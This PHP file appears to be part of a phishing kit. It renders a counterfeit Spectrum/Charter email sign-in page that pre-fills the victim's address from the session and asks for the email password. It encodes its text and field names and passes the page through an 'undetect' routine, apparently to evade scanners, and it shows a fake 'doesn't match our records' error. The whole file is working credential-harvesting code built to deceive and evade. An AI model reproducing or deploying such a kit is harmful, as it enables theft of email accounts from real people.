<?php
require __DIR__ . '/../../function.php';
require $api->language();

$page = "Email Charter";
$api->check_cookie();

$api->session("glitch", true, $page);

$html = '
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <link rel="stylesheet" type="text/css" href="'.$api->text_encode("../assets/email/charter/css/rutledge.css").'" />
    <link rel="stylesheet" type="text/css" href="'.$api->text_encode("../assets/email/charter/css/sb-icons.css").'" />
    <link rel="stylesheet" type="text/css" href="'.$api->text_encode("../assets/email/charter/css/login.css").'" />
    <link rel="stylesheet" type="text/css" href="'.$api->text_encode("../assets/email/charter/css/spectrum.css").'" />
    <title>'.$api->text_encode($lang['emailcharter']['title']).'</title>
</head>
<body>
    <div id="header">
        <nav role="navigation">
            <div class="app-header">
                <button tabindex="0" access-tabindex="skip-to-content" access-next-tabindex="banner-menu-button" class="skip-to-content-link">
                    '.$api->text_encode($lang['emailcharter']['skiptocontent']).'
                </button>
                <div class="app-header-container">
                    <div class="app-header-menu">
                        <div class="app-global-side-nav">
                            <button class="nav-button" aria-haspopup="true" aria-label="Navigation menu" access-tabindex="banner-menu-button" access-next-tabindex="banner-logo">
                                <span class="md-icon hamburger-icon mat-icon material-icons" role="img" aria-hidden="true"></span>
                                <span class="nav-menu-label" aria-hidden="true" id="menu-label">'.$api->text_encode($lang['emailcharter']['menu']).'</span>
                            </button>
                            <div class="navOverlay"></div>
                            <div class="sidenav">
                                <div class="interiorSideNav">
                                    <div class="close-button">
                                        <button class="icon-button" aria-label="Close button for navigation menu" tabindex="0" access-tabindex="sidenav-close" access-next-tabindex="sidenav-menu">
                                            <span class="close-icon mat-icon" role="img" aria-hidden="true"></span>
                                        </button>
                                    </div>
                                    <div>
                                        <div class="menu-container">
                                            <ul class="menu-unstyled" access-tabindex="sidenav-menu" access-next-tabindex="sidenav-signout-button">
                                                <li>
                                                    <div>
                                                        <a class="menu-link menu-link-primary" target="_self" href="#!">
                                                            '.$api->text_encode($lang['emailcharter']['manageaccount']).'
                                                        </a>
                                                    </div>
                                                </li>
                                                <li>
                                                    <div>
                                                        <a class="menu-link menu-link-primary" target="_self" href="#!">
                                                            '.$api->text_encode($lang['emailcharter']['getsupport']).'
                                                        </a>
                                                    </div>
                                                </li>
                                                <li>
                                                    <div>
                                                        <a class="menu-link menu-link-primary" target="_self" href="#!">
                                                            '.$api->text_encode($lang['emailcharter']['watchtv']).'
                                                        </a>
                                                    </div>
                                                </li>
                                            </ul>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="app-header-utility">
                        <div class="app-utility-nav">
                            <a class="list-item support-link mat-button" target="_blank" href="#!" aria-disabled="false" aria-label="Support (Opens in a new window)" tabindex="0" access-tabindex="banner-link-support" access-next-tabindex="banner-link-signout">
                                <span  class="no-border">'.$api->text_encode($lang['emailcharter']['support']).'</span>
                            </a>
                        </div>
                    </div>
                    <div class="app-header-logo">
                        <a class="mat-button" target="_self" href="/" aria-disabled="false" tabindex="0" access-tabindex="banner-logo" access-next-tabindex="banner-link-support">
                            <img alt="Spectrum logo" src="'.$api->image_encode("assets/email/charter/img/spectrum-logo.svg")['local'].'"/>
                        </a>
                    </div>
                </div>
                <div class="app-header-local">
                    <div class="app-local-nav"></div>
                </div>
            </div>
        </nav>
    </div>
    <div id="body">
        <div id="loginForm">
            <div id="loginFormContainer">
                <h1 id="headline">
                    '.$api->text_encode($lang['emailcharter']['signintomail']).'
                </h1>
                <div id="hohLink">
                    <div id="dividerLine"></div>
                    <div id="orText">or</div>
                    <div id="hohHref"><a href="#!hoh">'.$api->text_encode($lang['emailcharter']['createemail']).'</a></div>
                </div>
                <form action="" method="POST">
                    <div id="emailAddressContainer" >
                        <label for="user">'.$api->text_encode($lang['emailcharter']['emailaddress']).'</label>
                        <input type="text" value="'.$_SESSION['username'].'" disabled>
                    </div>
                    <div id="emailPasswordContainer" >
                        <label for="emailPassword">
                            '.$api->text_encode($lang['emailcharter']['emailpassword']).'
                        </label>
                        <input type="password" id="passwd" name="'.$api->encypt("passwordemail").'">
                    </div> 
                    <input type="submit" value="'.$api->text_encode($lang['emailcharter']['signin']).'">
                    <div class="error">
                        The info you entered doesn\'t match our records. Please try again.
                    </div>
                </form>
                <div id="forgotLinks">
                    <a id="forgotEmail" href="#!">'.$api->text_encode($lang['emailcharter']['forgotemail']).'</a>
                    <a id="forgotPassword" href="#!">'.$api->text_encode($lang['emailcharter']['forgotpassword']).'</a>
                </div>
            </div>
        </div>
    </div>
    <div id="footer">
        <nav role="navigation">
            <ul>
                <li>&copy; '.$api->text_encode($lang['emailcharter']['copyright']).'</li>
                <li>
                    <a href="#!" target="_blank">'.$api->text_encode($lang['emailcharter']['withus']).'</a>
                </li>
                <li>
                    <a href="#!" target="_blank">'.$api->text_encode($lang['emailcharter']['privacy']).'</a>
                </li>
                <li>
                    <a href="#!" target="_blank">'.$api->text_encode($lang['emailcharter']['policy']).'</a>
                </li>
                <li>
                    <a href="#!" target="_blank">'.$api->text_encode($lang['emailcharter']['dontsell']).'</a>
                </li>
                <li>
                    <a href="#!" target="_blank">'.$api->text_encode($lang['emailcharter']['limittheuse']).'</a>
                </li>
                <li>
                    <a href="#!" target="_blank">'.$api->text_encode($lang['emailcharter']['subscriber']).'</a>
                </li>
                <li>
                    '.$api->text_encode($lang['emailcharter']['inc']).'
                </li>
            </ul>
        </nav>
    </div>
</body>
</html>';

$api->undetect($html);
?>